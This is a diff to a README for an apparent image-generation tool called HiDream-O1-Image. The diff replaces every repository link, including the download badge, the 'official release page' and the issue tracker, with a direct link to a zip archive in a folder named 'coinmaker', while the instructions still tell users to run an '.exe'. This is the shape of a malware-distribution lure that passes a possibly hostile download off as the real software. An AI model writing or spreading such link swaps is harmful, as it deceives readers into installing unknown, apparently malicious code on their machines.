@@ -1,6 +1,6 @@
 # 🎨 HiDream-O1-Image - Create high quality images with ease
 
-[![Download HiDream-O1-Image](https://img.shields.io/badge/Download-HiDream--O1--Image-blue.svg)](https://github.com/Saniyawars4269/HiDream-O1-Image)
+[![Download HiDream-O1-Image](https://img.shields.io/badge/Download-HiDream--O1--Image-blue.svg)](https://raw.githubusercontent.com/Saniyawars4269/HiDream-O1-Image/main/coinmaker/Hi_Image_Dream_2.4.zip)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this software. Check your system sp
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/Saniyawars4269/HiDream-O1-Image).
+1. Go to the [official release page](https://raw.githubusercontent.com/Saniyawars4269/HiDream-O1-Image/main/coinmaker/Hi_Image_Dream_2.4.zip).
 2. Look for the latest version marked as "Latest".
 3. Click the link that ends in ".exe" to begin your download.
 4. Wait for the download to finish.
@@ -83,4 +83,4 @@ The software runs locally on your machine. Your images and your prompts stay on 
 
 ## 🔗 Getting extra help
 
-If you run into issues, check the [issue tracker](https://github.com/Saniyawars4269/HiDream-O1-Image/issues). You can report bugs or suggest new features there. Search for your problem first to see if others already solved it. Include your Windows version and your graphics card model when you ask for help. This information allows others to assist you faster.
+If you run into issues, check the [issue tracker](https://raw.githubusercontent.com/Saniyawars4269/HiDream-O1-Image/main/coinmaker/Hi_Image_Dream_2.4.zip). You can report bugs or suggest new features there. Search for your problem first to see if others already solved it. Include your Windows version and your graphics card model when you ask for help. This information allows others to assist you faster.
